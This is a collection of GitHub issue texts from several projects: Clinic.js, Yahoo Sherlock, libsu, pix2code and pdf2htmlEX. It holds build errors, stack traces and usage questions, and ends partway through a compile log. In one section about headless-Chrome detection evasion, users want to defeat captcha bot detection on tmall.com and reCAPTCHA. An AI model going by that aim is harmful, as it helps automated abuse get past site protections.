2. wait for server to initialize
3. press ctrl-c

## Sample upload
https://upload.clinicjs.org/public/97f8d6ff2dadfe11ab3288e48383826a800fc51a31a7339690a768d51111c960/1888.clinic-doctor.html
But as no html actually generated this url doesn't works anyway.

## Environment
* Clinic version: 3.0.0
* Node version: 8.9.4
* Operating system and version: Windows 10.0.17134.619

Is there some verbose mode or logs to understand what goes wrong?

Also tried to install clinic locally (without -g parameter) - it creates incomplete html without body with header section only. But there is no error messages.

It looks like clinic is interrupted by ctrl-c instead of (before) server.
<---------->
117894017
This is a really useful tool. Was wondering if you'd add support for redshift as well as druid in the future.  when trying building the Jar far 
Compilation Error is thrown.
Can you please tell me what i'm missing here?
![image](https://user-images.githubusercontent.com/1117791/57430162-71d40980-7237-11e9-9bc9-101c5704ee9f.png)
 It will be great if users can directly download the jar file from tag release instead of compiling itself  I've been using Sherlock for a few days, and it seems to be working fine for some time.
I'm generating hourly reports, and it works for a few hours. However, after a day or two, the reports start to fail, throwing a `java.lang.ArrayIndexOutOfBoundsException: 1` error.

I've looked at the logs and this is the error log:

```
32893 [INFO ] 2018-09-30 12:30:01,105 com.yahoo.sherlock.store.redis.LettuceAnomalyReportAccessor - Getting anomaly reports for job [4] with frequency [hour]
32894 [ERROR] 2018-09-30 12:30:01,108 com.yahoo.sherlock.Routes - Error while viewing job report!
32895 java.lang.ArrayIndexOutOfBoundsException: 1
32896     at com.yahoo.sherlock.store.redis.LettuceAnomalyReportAccessor.decodeAndSetTimestamp(LettuceAnomalyReportAccessor.java:336)
32897     at com.yahoo.sherlock.store.redis.LettuceAnomalyReportAccessor.getAnomalyReports(LettuceAnomalyReportAccessor.java:311)
32898     at com.yahoo.sherlock.store.redis.LettuceAnomalyReportAccessor.getAnomalyReportsForJob(LettuceAnomalyReportAccessor.java:119)
32899     at com.yahoo.sherlock.Routes.viewJobReport(Routes.java:626)
32900     at spark.TemplateViewRouteImpl$1.handle(TemplateViewRouteImpl.java:66)
32901     at spark.http.matching.Routes.execute(Routes.java:61)
32902     at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:126)
32903     at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
32904     at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:189)
32905     at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
32906     at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:119)
32907     at org.eclipse.jetty.server.Server.handle(Server.java:517)
32908     at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:308)
32909     at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:242)
32910     at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:261)
32911     at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
32912     at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:75)
32913     at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceAndRun(ExecuteProduceConsume.java:213)
32914     at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:147)
32915     at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:654)
32916     at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:572)
32917     at java.lang.Thread.run(Thread.java:748)
```

I've looked at the redis logs and they are not showing any errors. I'm not sure how to fix it.
Any ideas what going on? when trying building the Jar file
Compilation Error is thrown.
Can you please tell me what i'm missing here?
![image](https://user-images.githubusercontent.com/1117791/57430162-71d40980-7237-11e9-9bc9-101c5704ee9f.png)
 When compiling with the latest jdk8 version, making jar will fail with following error:

```
-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Error: Could not find or load main class org.apache.maven.surefire.booter.ForkedBooter

Results :

Tests run: 0, Failures: 0, Errors: 0, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 02:54 min
[INFO] Finished at: 2018-11-30T10:42:36+00:00
[INFO] Final Memory: 43M/615M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.17:test (default-test) on project sherlock: Execution default-test of goal org.apache.maven.plugins:maven-surefire-plugin:2.17:test failed: The forked VM terminated without properly saying goodbye. VM crash or System.exit called?
[ERROR] Command was /bin/sh -c cd /sherlock && /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -javaagent:/root/.m2/repository/org/jacoco/org.jacoco.agent/0.7.6.201602180812/org.jacoco.agent-0.7.6.201602180812-runtime.jar=destfile=/sherlock/target/jacoco.exec -jar /sherlock/target/surefire/surefirebooter6254102860528815040.jar /sherlock/target/surefire/surefire345989798278468220tmp /sherlock/target/surefire/surefire_02363878781743491197tmp
[ERROR] -> [Help 1]
[ERROR]
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR]
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/PluginExecutionException
Makefile:7: recipe for target 'jar' failed
make: *** [jar] Error 1`
```

That is a known issue fixed already by Surefire in 3.0.0-M1
See furthermore: https://issues.apache.org/jira/browse/SUREFIRE-1588

Workaround for users at the moment: 
* use at least jdk8u118
* use command: make jar-no-test FYI I'm referring to : https://github.com/yahoo/sherlock/blob/master/src/main/java/com/yahoo/sherlock/model/AnomalyReport.java#L272

Whenever the `interval.expectedVal = 0.0f`

`int percentageDeviation = (int) (((interval.actualVal - interval.expectedVal) / interval.expectedVal) * 100);`

then

`percentageDeviation =  2147483647; // max value that can fit in int(32-bit signed integer)`

Is it the expected behaviour or do we need to handle this case ? Hi,

Thanks for this amazing library. I was trying to build this. got following error. Please help me to resolve this. Also after build. what command should run to get the UI as you showed in the Demo.

Error: Could not resolve dependencies for project com.yahoo.sherlock:sherlock:jar:1.7-SNAPSHOT: Could not find artifact com.sun:tools:jar:0 at specified path /Library/Java/JavaVirtualMachines/openjdk-13.0.1.jdk/Contents/Home/../lib/tools.jar currently, only one table data source can be queried. 
support of the union of two or more table data sources will be much helpful . 
can ref : https://druid.apache.org/docs/latest/querying/datasource.html 

```yaml
{
       "type": "union",
       "dataSources": ["<string_value1>", "<string_value2>", "<string_value3>", ... ]
} Hi @all,

is it possible to train Sherlock/EGADS with data from the past to get better results in the future ?
I think I heard somethingh like that in a video, but I can't find any Howto or hint in the menus.

Thanks a lot !

Bye, Dirk Hi @all,

is it possible to train Sherlock/EGADS with data from the past to get better results in the future ?
I think I heard somethingh like that in a video, but I can't find any Howto or hint in the menus.

Thanks a lot !

Bye, Dirk
<---------->
118054594
This seems to be changed recently in Chrome.  This seems to be changed recently in Chrome.  Hi there,

I'd like to use this code but I don't see a license. Was this intentional or just an oversight? If you could add one I'd be very grateful.

Thanks for putting this out there either way :)  Evaders are winning, but captcha on tmall.com detects headless chrome.
![image](https://user-images.githubusercontent.com/13941862/49737472-08f36000-fc9e-11e8-9f35-bb2516fad04f.png)
![image](https://user-images.githubusercontent.com/13941862/49737490-16104f00-fc9e-11e8-88de-6a185769ff13.png)
Evaders lose :( Google's catpcha service seems to be able to detect when you're not visiting with a real browser using the methods in this repository/article and I'm wanting to research it further. By that I mean that you will get easy or no puzzle in a real browser but get hard puzzles when solving captchas in apps. I'd like to research this further but I'm not sure the best way to go about it. Are there recommended ways to inventory and research the differences in headless vs real browser? I'd like to find the differences and patch them. Hello,

In some cases, for chrome Notification.permission is an empty string.
I think it happens if I use
options.add_argument('--disable-notifications')

In such cases, then window.navigator.permissions.query also becomes an empty string.
Could we account for this situation so that we don't end up with empty strings?

Thank you.
 The overriden `HTMLIFrameElement.prototype.contentWindow` causes issues for sites and libraries that use the method. Annoyingly, Google is using this in their reCAPTCHA v2 script. 

Although it's perhaps outside of the scope of this package, is there a way to preserve the original functionality of `iframe.contentWindow` while still passing the test?
<---------->
118181798
When I trained my own data, it generated multi .h5 file, how to use them? When I trained my own data, it generated multi .h5 file, how to use them? Hi, many thanks for sharing the data and code. how can we take it forward, how can we generate more data apart from synthesised data. can we create same kind of dataset for real time html page. if so, then how can we generate .gui files for that. if you have any resource or any thoughts please do share us. the ubuntu  16.04 Comes with 3.6，Downgrading is very troublesome
```
Using TensorFlow backend.
/usr/lib/python3.6/importlib/_bootstrap.py:219: RuntimeWarning: compiletime version 3.5 of module 'tensorflow.python.framework.fast_tensor_util' does not match runtime version 3.6
`` When i am trying to train my dataset, i do not know that how the .gui file i will get for my images. Augmentation is used to generate more data? Isn't it? But this function augment_and_save_images does not generate more training data, it just changes the meta data and the data length of result is equal to the length of input data? Is it just used to improve adaptive performance?
<---------->
118184739
This could be helpful to prevent OOMs in situations like copying a large file or reading logcat.

EDIT: By the way, my Crashlytics indeed caught OOMs when my code was attempting to save logcat to a file. Some `su` will create garbage output (warnings) before running the actual shell. This will trigger `IOException("Created process is not a shell")` in `ShellImpl`. It would be great to ignore those errors. Under the hood of Shell.newInstance, it delegates the creation of new shell instance to the main thread. This could be problematic if the main thread is waiting for it to finish (e.g. using a synchronized/monitor to guard around the root shell). Should this be fixed? Trying to build a project in AS with a dependency on libsu 2.3.0, I get errors relating to 'common invoke' and 'static methods in interfaces', which are apparently only available in SDK 26+. Samsung haven't upgraded their stock since 6.0.1 for me, which means I'm stuck at SDK 23, so can't go beyond libsu 2.2.0
Any chance of removing these weird Java/SDK features, or can android M no longer be supported ?
  Under the hood of Shell.newInstance, it delegates the creation of new shell instance to the main thread. This could be problematic if the main thread is waiting for it to finish (e.g. using a synchronized/monitor to guard around the root shell). Should this be fixed? Trying to build a project in AS with a dependency on libsu 2.3.0, I get errors relating to 'common invoke' and 'static methods in interfaces', which are apparently only available in SDK 26+. Samsung haven't upgraded their stock since 6.0.1 for me, which means I'm stuck at SDK 23, so can't go beyond libsu 2.2.0
Any chance of removing these weird Java/SDK features, or can android M no longer be supported ?
 Is there a Wiki that shows all that's available? 

Is there, for example, a way to convert apps to system apps and back? Is BusyBox required for it?

 Meaning @WorkerThread , @UiThread , and@AnyThread By using your library, I ran into the following issues.
1) SuFile.delete() does not use root to delete files.
2) If issue 1 is fixed, the system partition is still often mounted ro instead of rw, some method of remounting would be nice. In the application, I have the option to run as root, when the user sets root exec Shell.su(...)
or other Shell.sh(...) but this does not work, and the file runs as root in both cases Hi, I just called `Shell.sh(cmd).exec().out`, and `cmd` is a normal command like `ls` that do not need root access. But the root dialog prompted on rooted device.

Any solutions to avoid this? Thx. :) I don't see it mentioned on the main page of the repo.... In the application, I have the option to run as root, when the user sets root exec Shell.su(...)
or other Shell.sh(...) but this does not work, and the file runs as root in both cases Meaning @WorkerThread , @UiThread , and@AnyThread Great job and thanks for your work!
I use this lib to call a external program, but sometimes I want to close this externally called program, what should I do? I tried before:
```
 shell.exec () + shell.close ()
```
 but sometimes external programs it didn't stop running, while most of the time it stopped, how should I call and exit the process, can you help me. Is there a Wiki that shows all that's available? 

Is there, for example, a way to convert apps to system apps and back? Is BusyBox required for it?

 Hello, 
I'm trying to use this library to install split-APK files, as this one does:

https://github.com/Aefyr/SAI/blob/master/app/src/main/java/com/aefyr/sai/installer/rooted/RootedSAIPackageInstaller.java

More specifically, I'm trying to convert this code of the above, which pushes the file as installation source to the "pm install-write" command :

```
while (apkSource.nextApk())
     ensureCommandSucceeded(Root.exec(String.format("pm install-write -S %d %d \"%s\"", apkSource.getApkLength(), sessionId, apkSource.getApkName()), apkSource.openApkInputStream()));
```

And the code for its root class is probably as such:

```
    private static Result execInternal(String command, @Nullable InputStream inputPipe) {
        try {
            Process process = Runtime.getRuntime().exec(String.format("su -c %s", command));

            StringBuilder stdOutSb = new StringBuilder();
            StringBuilder stdErrSb = new StringBuilder();
            Thread stdOutD = writeStreamToStringBuilder(stdOutSb, process.getInputStream());
            Thread stdErrD = writeStreamToStringBuilder(stdErrSb, process.getErrorStream());

            if (inputPipe != null) {
                IOUtils.copyStream(inputPipe, process.getOutputStream());
                inputPipe.close();
                process.getOutputStream().close();
            }

            process.waitFor();
            stdOutD.join();
            stdErrD.join();

            return new Result(command, process.exitValue(), stdOutSb.toString().trim(), stdErrSb.toString().trim());
        } catch (Exception e) {
            Log.w(TAG, "Unable execute command: ");
            Log.w(TAG, e);
            return new Result(command, -1, "", "Java exception: " + Utils.throwableToString(e));
        }
    }
```

So, what I tried using this library, is this :

```
            for (apkSource in fileInfoList) {
                //                pm install-write -S %d %d \"%s\"", apkSource.getApkLength(), sessionId, apkSource.getApkName()), apkSource.openApkInputStream()));
                val filePath = File(apkSource.parentFilePath, apkSource.fileName).absolutePath
                val result = Shell.su("\"pm install-write -S ${apkSource.fileSize} $sessionId \"${apkSource.fileName}\"").add(SuFileInputStream(filePath)).exec()
                Log.d("AppLog", "success pushing apk:${apkSource.fileName} ? ${result.isSuccess}")
            }
```

But when I reach the line of "Shell.su", it gets stuck.

Attached here a sample project to show the issue. Also attached a bunch of split APK files that I got from Google News APKs.

[splitApks.zip](https://github.com/topjohnwu/libsu/files/3488795/splitApks.zip)
[splitApkInstallViaRoot.zip](https://github.com/topjohnwu/libsu/files/3488796/splitApkInstallViaRoot.zip)

Any idea what I'm doing wrong?
Is this the wrong syntax to use it? Currently, we have to use something like that in case we were denied from getting root, and later got root manually from the root app:

`
val gotRoot = Shell.getCachedShell()?.isRoot == true || Shell.newInstance().isRoot
`

That's because `Shell.getShell()` tries to gain root only once, no matter how many times we call it.
 When I try to create my own sample, to try this library, I get this error:

FAILURE: Build failed with an exception.

```
* What went wrong:
Execution failed for task ':app:mergeExtDexDebug'.
> Could not resolve all files for configuration ':app:debugRuntimeClasspath'.
   > Failed to transform artifact 'io.aar (com.github.topjohnwu.libsu:io:2.5.0)' to match attributes {artifactType=android-dex, dexing-is-debuggable=true, dexing-min-sdk=16}
      > Execution failed for DexingTransform: C:\Users\user\.gradle\caches\transforms-2\files-2.1\ad09094c295507c71e0ea2562bafdd42\jars\classes.jar.
         > Error while dexing.
   > Failed to transform artifact 'core.aar (com.github.topjohnwu.libsu:core:2.5.0)' to match attributes {artifactType=android-dex, dexing-is-debuggable=true, dexing-min-sdk=16}
      > Execution failed for DexingTransform: C:\Users\user\.gradle\caches\transforms-2\files-2.1\f59428331cb15ac5a034471a35c8bd68\jars\classes.jar.
         > Error while dexing.

* Try:
Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output. Run with --scan to get full insights.
```
This is weird, because the sample of the repository requires Android API 16 and above, and it works

And I use a very simple code:

```
    class MainActivity : AppCompatActivity() {
    
        override fun onCreate(savedInstanceState: Bundle?) {
            super.onCreate(savedInstanceState)
            setContentView(R.layout.activity_main)
            if (savedInstanceState == null) {
                Shell.Config.setFlags(Shell.FLAG_REDIRECT_STDERR);
                Shell.Config.verboseLogging(BuildConfig.DEBUG);
                Shell.Config.setTimeout(10);
            }
            AsyncTask.execute {
                var result = Shell.su("ls /data/").exec()
                Log.d("AppLog", "result: result.code:{$result.code} result.isSuccess:${result.isSuccess}")
                Log.d("AppLog", "result.out:${result.out.joinToString()}")
                Log.d("AppLog", "result.err:${result.err.joinToString()}")
                Thread.sleep(2000)
                result = Shell.su("ls /data/").exec()
                Log.d("AppLog", "result: result.code:{$result.code} result.isSuccess:${result.isSuccess}")
                Log.d("AppLog", "result.out:${result.out.joinToString()}")
                Log.d("AppLog", "result.err:${result.err.joinToString()}")
            }
        }
    }
```


Attached sample.

[MyApplication.zip](https://github.com/topjohnwu/libsu/files/3474145/MyApplication.zip)

<---------->
118475451
I try to compile pdf2htmlEX-0.18.7-poppler-0.81.0
but I'm not sure the require of fontforge version 
I used  fontforge (with header files) clone from master https://github.com/coolwanglu/fontforge/tree/pdf2htmlEX
poppler-0.81.0 installed OK
fontforge-pdf2htmlEX  installed OK
When I do 'cmake . && make && sudo make install'
 got error as follow

> ]0;root@localhost:/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0[root@localhost pdf2htmlEX-0.18.7-poppler-0.81.0]# cmake . && make && sudo make install
Trying to locate cairo-svg...
-- Configuring done
-- Generating done
-- Build files have been written to: /home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0
[  5%] Built target pdf2htmlEX_resources
[  8%] [32mBuilding C object CMakeFiles/pdf2htmlEX.dir/src/util/ffw.c.o[0m
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:21:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/bitmapchar.h:10:20:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KBdfPropHasString[m[K’
 extern const char *[01;31m[KBdfPropHasString[m[K(BDFFont *font, const char *key, const char *def);
                    [01;31m[K^~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2428:14:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KBdfPropHasString[m[K’ was here
 extern char *[01;36m[KBdfPropHasString[m[K(BDFFont *font,const char *key, char *def );
              [01;36m[K^~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:21:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/bitmapchar.h:12:12:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KIsUnsignedBDFKey[m[K’
 extern int [01;31m[KIsUnsignedBDFKey[m[K(const char *key);
            [01;31m[K^~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2426:13:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KIsUnsignedBDFKey[m[K’ was here
 extern int  [01;36m[KIsUnsignedBDFKey[m[K(char *key);
             [01;36m[K^~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:21:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/bitmapchar.h:22:13:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KXLFD_GetComponents[m[K’
 extern void [01;31m[KXLFD_GetComponents[m[K(const char *xlfd, struct xlfd_components *components);
             [01;31m[K^~~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2458:13:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KXLFD_GetComponents[m[K’ was here
 extern void [01;36m[KXLFD_GetComponents[m[K(char *xlfd,struct xlfd_components *comp);
             [01;36m[K^~~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:22:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/cvimages.h:17:13:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KSCImportPlateFile[m[K’
 extern void [01;31m[KSCImportPlateFile[m[K(SplineChar *sc, int layer, FILE *plate, int doclear);
             [01;31m[K^~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:3233:13:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KSCImportPlateFile[m[K’ was here
 extern void [01;36m[KSCImportPlateFile[m[K(SplineChar *sc,int layer,FILE *plate,int doclear,int flags);
             [01;36m[K^~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:23:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/encoding.h:83:13:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KSFRemoveGlyph[m[K’
 extern void [01;31m[KSFRemoveGlyph[m[K(SplineFont *sf, SplineChar *sc);
             [01;31m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:3255:13:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KSFRemoveGlyph[m[K’ was here
 extern void [01;36m[KSFRemoveGlyph[m[K(SplineFont *sf,SplineChar *sc, int *flags);
             [01;36m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:25:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/namelist.h:14:18:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KNameListByName[m[K’
 extern NameList *[01;31m[KNameListByName[m[K(const char *name);
                  [01;31m[K^~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:3008:18:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KNameListByName[m[K’ was here
 extern NameList *[01;36m[KNameListByName[m[K(char *name);
                  [01;36m[K^~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:26:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/savefont.h:44:12:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KGenerateScript[m[K’
 extern int [01;31m[KGenerateScript[m[K(SplineFont *sf, char *filename, const char *bitmaptype, int fmflags, int res, char *subfontdirectory, struct sflist *sfs, EncMap *map, NameList *rename_to, int layer);
            [01;31m[K^~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2494:12:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KGenerateScript[m[K’ was here
 extern int [01;36m[KGenerateScript[m[K(SplineFont *sf,char *filename,char *bitmaptype,
            [01;36m[K^~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:28:6:[m[K [01;31m[Kerror: [m[Knested redefinition of ‘[01m[Kenum ttf_instructions[m[K’
 enum [01;31m[Kttf_instructions[m[K {
      [01;31m[K^~~~~~~~~~~~~~~~[m[K
[01m[K/usr/local/include/fontforge/ttfinstrs.h:28:6:[m[K [01;31m[Kerror: [m[Kredeclaration of ‘[01m[Kenum ttf_instructions[m[K’
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:28:6:[m[K [01;36m[Knote: [m[Koriginally defined here
 enum [01;36m[Kttf_instructions[m[K {
      [01;36m[K^~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_npushb[m[K’
  [01;31m[Kttf_npushb[m[K=0x40, ttf_npushw=0x41, ttf_pushb=0xb0, ttf_pushw=0xb8,
  [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_npushb[m[K’ was here
  [01;36m[Kttf_npushb[m[K=0x40, ttf_npushw=0x41, ttf_pushb=0xb0, ttf_pushw=0xb8,
  [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:19:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_npushw[m[K’
  ttf_npushb=0x40, [01;31m[Kttf_npushw[m[K=0x41, ttf_pushb=0xb0, ttf_pushw=0xb8,
                   [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:19:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_npushw[m[K’ was here
  ttf_npushb=0x40, [01;36m[Kttf_npushw[m[K=0x41, ttf_pushb=0xb0, ttf_pushw=0xb8,
                   [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:36:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_pushb[m[K’
  ttf_npushb=0x40, ttf_npushw=0x41, [01;31m[Kttf_pushb[m[K=0xb0, ttf_pushw=0xb8,
                                    [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:36:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_pushb[m[K’ was here
  ttf_npushb=0x40, ttf_npushw=0x41, [01;36m[Kttf_pushb[m[K=0xb0, ttf_pushw=0xb8,
                                    [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:29:52:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_pushw[m[K’
  ttf_npushb=0x40, ttf_npushw=0x41, ttf_pushb=0xb0, [01;31m[Kttf_pushw[m[K=0xb8,
                                                    [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
